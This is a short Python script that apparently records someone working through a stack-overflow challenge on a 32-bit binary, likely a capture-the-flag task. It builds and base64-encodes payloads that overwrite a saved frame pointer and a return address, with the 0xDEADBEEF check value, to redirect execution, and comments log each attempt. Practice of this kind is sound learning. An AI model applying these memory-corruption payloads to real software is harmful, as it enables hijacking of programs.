import base64

def int_to_bytes(number: int) -> bytes:
    return number.to_bytes(length=(8 + (number + (number < 0)).bit_length()) // 8, byteorder='big', signed=True)

#string = b'\x90\xa6\x0d\x08\x61\x61\x61\x61\x11\x41\x52\x21'
#string2 = b'\x11\x41\x52\x21\x61\x61\x61\x61\x90\xa6\x0d\x08'
#string3 = b'\x11\x41\x52\x21\x61\x61\x61\x61\x0c\x94\x04\x08'
#string4 = b'\x11\x41\x52\x21\x61\x61\x61\x61\x11\x94\x04\x08'
#string5 = b'\x11\x41\x52\x21\x08\x94\x04\x08\x24\xd2\xff\xff' #putting address of call correct in buffer and address of that in edp
#string6 = b'\x11\x41\x52\x21\x61\x61\x61\x61\x08\x94\x04\x08' #putting address of call correct in buffer and address of that in edp
#string7 = b'\x24\xd2\xff\xff\x0c\x94\x04\x08\x20\xd2\xff\xff' #using dual pointer to get to our call (but input wont have the right start bytes)
# string 7 got it to go into correct, but now it isnt passing the test on input
string8 = b'\x11\x41\x52\x21\x0c\x94\x04\x08\x20\xd2\xff\xff' # EUFSIQyUBAgg0v// got in, gotta make negative
integer = -559038737
lead = int_to_bytes(integer)
littleendianed = bytearray(lead)
littleendianed.reverse() 
final = bytes(littleendianed)
#stringUNFIXED = final + b'\x0c\x94\x04\x08\x20\xd2\xff\xff' # 776t3gyUBAgg0v//
#stringGDBSERVER = final + b'\x0c\x94\x04\x08\xf0\xd4\xff\xff' # fixed for server (GDB) 776t3gyUBAjw1P//
#string9 = final + b'\x0c\x94\x04\x08\x08\x94\x04\x08' # fixed for server, not right 776t3gyUBAgIlAQI

stringGOOD = final +b'\x0c\x94\x04\x08\x40\xeb\x11\x08' # fixed for server point to INPUT saved in mem 776t3gyUBAhA6xEI
print(stringGOOD)
encode = base64.b64encode(stringGOOD)
decode = base64.b64decode(encode)

print(encode)
print(decode)

# Little endian with 8 a's X5IECGFhYWFhYWFhEUFSIQ==

# Little endian with 0 a's X5IECBFBUiE=

# Little endian with 4 a's location of call correct command BpQECGFhYWERQVIh

# Little endian with 4 a's and the proper ebp to strcmp return 0 kKYNCGFhYWERQVIh

# Little endian with 4 a's and the proper ebp to strcmp return 0 kKYNCGFhYWERQVIh

# Little endian with 4 a's and address to call correct as the thing to be put where ebp points EUFSIWFhYWEMlAQI

# Little endian with 4 a's and address to call correct as the thing to be put where ebp points TAKING INTO ACCOUNT ESP SHIFT 
# EUFSIWFhYWEIlAQI

# little endian string 5 (putting address of call in buffer and that address in edp) EUFSIQiUBAgk0v//

# little endian string 6 (string 5 but with proper placement ) EUFSIWFhYWEIlAQI

# string 7 JNL//wyUBAgg0v//